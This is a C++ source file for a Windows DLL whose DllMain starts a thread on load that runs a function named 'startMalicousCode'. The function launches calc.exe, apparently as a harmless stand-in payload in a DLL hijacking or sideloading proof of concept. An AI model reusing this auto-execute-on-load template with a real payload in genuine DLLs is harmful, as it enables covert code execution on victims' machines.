// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "exports.h"
#include <iostream>

INT startMalicousCode(HMODULE hModule);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)startMalicousCode, hModule, NULL, nullptr);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

INT startMalicousCode(HMODULE hModule)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process
    // nullptr means use the current environment
    // nullptr for current directory means use current directory
    // lpCommandLine needs to be a modifiable string in Windows API
    wchar_t prog[] = TEXT("calc.exe");
    const LPWSTR commandLine = prog;

    BOOL success = CreateProcess(
        nullptr,               // No module name (use command line)
        commandLine,        // Command line (executable name)
        nullptr,               // Process handle not inheritable
        nullptr,               // Thread handle not inheritable
        FALSE,              // No handle inheritance
        0,                  // No creation flags
        nullptr,               // Use parent's environment 
        nullptr,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi                 // Pointer to PROCESS_INFORMATION structure
    );

    // Check if process creation was successful
    if (!success)
    {
        // GetLastError() returns the error code
        DWORD error = GetLastError();
        std::cerr << "Failed to launch calculator. Error code: " << error << "\n";
        return false;
    }

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}